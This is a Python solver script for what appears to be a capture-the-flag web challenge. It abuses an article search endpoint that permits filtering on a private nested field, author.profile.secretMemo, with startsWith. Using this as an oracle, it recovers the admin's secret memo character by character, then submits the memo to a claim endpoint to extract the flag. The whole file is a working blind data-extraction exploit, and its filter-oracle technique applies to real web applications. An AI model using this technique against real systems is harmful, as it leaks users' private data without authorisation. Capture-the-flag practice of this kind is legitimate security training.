import re
import sys

FLAG_RE = re.compile(r"ctf4b\{[^}]*\}")
BASE = "URL"
HEX = "0123456789abcdef"
MEMO_LEN = 12


def main() -> None:
    base = (sys.argv[1] if len(sys.argv) > 1 else BASE).rstrip("/")

    try:
        import httpx
        client = httpx.Client(base_url=base, timeout=20, follow_redirects=True)
        get, post = client.get, client.post
    except ImportError:
        import requests
        s = requests.Session()
        get = lambda p, **kw: s.get(base + p, timeout=20, **kw)
        post = lambda p, **kw: s.post(base + p, timeout=20, **kw)

    def admin_matches(prefix: str) -> bool:
        r = get(
            "/api/articles/search",
            params={
                "field": "author.profile.secretMemo",
                "op": "startsWith",
                "value": prefix,
            },
        )
        data = r.json()
        return any(
            (a.get("author") or {}).get("profile", {}).get("displayName") == "admin"
            for a in data.get("articles", [])
        )

    assert admin_matches(""), "oracle broken"

    memo = ""
    for pos in range(MEMO_LEN):
        for c in HEX:
            if admin_matches(memo + c):
                memo += c
                print(f"[{pos + 1:2}/{MEMO_LEN}] secretMemo = {memo}")
                break
        else:
            print("no hex char matched — aborting")
            return

    print(f"\nadmin secretMemo = {memo}")

    r = post("/api/claim", json={"memo": memo})
    print(f"POST /api/claim -> {r.status_code}: {r.text}")
    m = FLAG_RE.search(r.text)
    print("FLAG:", m.group() if m else "not found")


if __name__ == "__main__":
    main()
